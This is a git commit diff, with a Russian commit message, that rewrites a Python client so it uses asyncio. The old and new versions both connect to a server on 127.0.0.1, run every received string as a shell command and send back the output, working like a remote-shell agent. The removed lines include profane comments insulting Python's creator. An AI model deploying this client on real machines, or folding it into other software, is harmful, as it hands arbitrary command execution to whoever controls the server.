46ad90d336e8783e35f089a22b53f32f462cbc4d
lalds <laldskin@gmail.com>
2025-02-08 17:22:05 +0300

    написана асинхронная клиентская часть

--- main/client/client.py
+++ main/client/client.py
@@ -1,34 +1,21 @@
 import socket
 import os
 import subprocess
-
-def start_client(host, port):
-  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-    s.connect((host, port))
-    print(f"Подключено к серверу {host}:{port}")
-
-
-    while True:
-      command = s.recv(1024).decode()
-      if command.lower() == 'exit':
-        print("Выход из клиента.")
-        break
-      print(f"Получена команда: {command}")
-      # ! КАКАЯ ЖЕ ЭТА ЕБАННАЯ ССАНИНА Я ЕГО МАТЬ ЕБАЛ
-      try:
-        # Выполнение команды и получение результата
-        output = subprocess.run(command, capture_output=True, text=True, shell=True)
-        response = output.stdout + output.stderr
-        print(output.stdout)
-        if response == "" or response == None:
-          s.sendall("Команда выполнилась без вывода".encode())
-      # ! РОССУМ КОНЧЕННЫЙ ХУЕСОС С ЕГО ЕБАНЫМ ЯЗЫКОМ Я НЕНАВИЖУ СВОЮ РАБОТУ
-      except Exception as e:
-        response = str(e)
-
-      # Отправка результата обратно на сервер
-      s.sendall(response.encode())
-
+import asyncio
+async def client(host, port):
+  # подключаемся к нашему серверу
+  reader, writer = await asyncio.open_connection(host, port)
+  # ждем ответа сервера(обрабатываем по 100 байт данных)
+  while True:
+    data = await reader.read(100)
+    if not data:
+      break
+    # получаем команду и выводим в командную строку
+    result = subprocess.run(data.decode(), shell=True, capture_output=True, text=True)
+    # закидываем в буфер
+    writer.write((result.stdout if result.stdout else f"Ошибка!: {result.stderr}").encode())
+    # отправляем сокету и чистим бувер
+    await writer.drain()
 
 if __name__ == "__main__":
-  start_client("127.0.0.1", 65432)
+  asyncio.run(client('127.0.0.1', 65432))
